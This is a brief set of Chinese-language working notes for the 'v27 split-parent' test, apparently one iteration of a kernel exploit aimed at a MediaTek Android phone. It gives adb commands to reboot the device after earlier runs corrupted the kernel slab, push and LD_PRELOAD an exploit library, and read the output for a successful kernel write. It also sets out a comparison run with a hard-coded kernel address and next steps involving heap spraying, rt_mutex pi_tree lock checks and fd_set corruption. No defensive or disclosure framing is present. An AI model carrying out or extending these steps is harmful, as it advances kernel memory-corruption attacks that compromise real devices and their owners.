# 下一步操作 — v27 split-parent 测试

## 1. 重启手机 (重要!)
v25/v26 测试把内核 slab 搞脏了, 先重启:
  adb reboot
  等待重启完成 (~30s)

## 2. 推送 v27
  adb push preload_mtk_v27.so /data/local/tmp/preload.so

## 3. 运行测试 (默认 split-parent)
  adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 | tee v27_1.txt

## 4. 判断结果
  ★ 成功标志: 输出中出现 "cfi write ret=N" (N>0)
     而不是 "direct write ret=-1 errno=22"
  
  ★ 如果 ret 比之前高很多 (比如 200+):
     pi_tree 路径可能也触发了, 两个 rb_erase 同时改 fd_set
  
  ★ 如果 ret 和之前一样 (150~161):
     pi_tree 路径没触发, FOPS-8 单独不过验证

## 5. 对比测试: 恢复旧行为
  adb shell "PSELECT_PI_PARENT=ffffff80028e76d9 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 | tee v27_old.txt

## 6. 如果 split-parent 不触发 (ret 没变化)
  需要分析 pi_tree 路径为什么不过验证. 可能的方向:
  - waiter.lock 字段需要指向真实的 PI mutex (当前是 sprayed page 地址)
  - 需要修改 fd_set word 7 (lock) 为真实 lock 地址
  - 查看 rt_mutex_chain.asm 中 pi_tree 路径的 lock 回指验证
